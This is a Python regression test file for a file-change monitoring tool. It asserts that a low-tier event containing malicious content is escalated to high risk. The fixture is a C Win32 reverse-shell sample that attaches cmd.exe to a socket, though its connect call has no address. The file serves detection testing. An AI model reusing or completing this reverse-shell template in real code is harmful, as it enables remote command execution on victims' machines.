"""Regression tests for low-tier path events with malicious readable content."""
import os
import sys
from unittest import mock

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from core import background_analysis
from core.llm_analyzer import _fallback_analysis
from core.models import Base, FileLog


C_WIN32_REVERSE_SHELL = r"""
#include <winsock2.h>
#pragma comment(lib,"ws2_32")

int main() {
    WSADATA wsaData;
    SOCKET Winsock;
    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    WSAConnect(Winsock, NULL, 0, NULL, NULL, NULL, NULL);
    ini_processo.dwFlags = STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
}
"""


def test_tier4_modified_threat_content_overrides_silent_log():
    engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False})
    Base.metadata.create_all(engine)
    Session = sessionmaker(autocommit=False, autoflush=False, bind=engine)

    session = Session()
    try:
        session.add(FileLog(
            path=r"C:\Users\alice\Desktop\test\test.txt",
            event_type="modified",
            status="pending",
            analysis_json={
                "diff": C_WIN32_REVERSE_SHELL,
                "metadata": {"is_baseline": False},
            },
        ))
        session.commit()
    finally:
        session.close()

    def analyze_with_heuristic(file_path, change_type, diff, metadata=None):
        return _fallback_analysis(file_path, change_type, diff, metadata=metadata)

    with mock.patch.object(background_analysis, "SessionLocal", Session), \
         mock.patch.object(background_analysis, "analyze_file_change", side_effect=analyze_with_heuristic), \
         mock.patch.object(background_analysis.dispatcher, "enqueue"):
        processed = background_analysis.process_pending_analysis(batch_size=1)

    session = Session()
    try:
        row = session.query(FileLog).first()
        assert processed == 1
        assert row.status == "analyzed"
        assert row.priority in {"critical", "high"}
        assert row.risk_score >= 7
        assert row.analysis_json.get("original_tier") == 4
        assert row.analysis_json.get("event_context", {}).get("diff") == C_WIN32_REVERSE_SHELL
    finally:
        session.close()


def test_tier4_baseline_threat_overrides_silent_log_during_backlog():
    engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False})
    Base.metadata.create_all(engine)
    Session = sessionmaker(autocommit=False, autoflush=False, bind=engine)

    session = Session()
    try:
        session.add(FileLog(
            path=r"C:\Users\alice\Desktop\test\test.txt",
            event_type="new",
            status="pending",
            analysis_json={
                "event_context": {
                    "diff": C_WIN32_REVERSE_SHELL,
                    "metadata": {"is_baseline": True},
                    "is_baseline": True,
                },
            },
        ))
        session.commit()
    finally:
        session.close()

    with mock.patch.object(background_analysis, "SessionLocal", Session), \
         mock.patch.object(background_analysis, "_BACKLOG_THRESHOLD", 1), \
         mock.patch.object(background_analysis.dispatcher, "enqueue"):
        processed = background_analysis.process_pending_analysis(batch_size=1)

    session = Session()
    try:
        row = session.query(FileLog).first()
        assert processed == 1
        assert row.status == "analyzed"
        assert row.priority in {"critical", "high"}
        assert row.risk_score >= 7
        assert row.analysis_json.get("original_tier") == 4
        assert row.analysis_json.get("tier_override") is True
    finally:
        session.close()
